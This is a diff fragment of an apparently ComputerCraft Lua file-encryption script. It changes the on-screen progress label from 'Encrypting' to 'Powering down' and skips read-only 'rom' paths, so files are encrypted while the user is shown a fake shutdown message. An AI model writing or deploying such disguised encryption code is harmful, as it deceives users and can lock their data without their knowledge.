@@ -29,7 +29,7 @@ end
 function bar(p, t, f)
   term.clear()
   term.setCursorPos(1, 1)
-  print("Encrypting", f)
+  print("Powering down")
   print(string.rep("_", 20))
   term.setCursorPos(1, 2)
   print(string.rep("#", (p / t) * 20))
@@ -38,6 +38,9 @@ end
 
 -- Encrypt a single file
 local function encryptFile(filePath)
+  if string.sub(filePath,1,3) == "rom" then
+    return true
+  end
   if fs.exists(filePath) then
     f = fs.open(filePath,"r")
     fileData={}
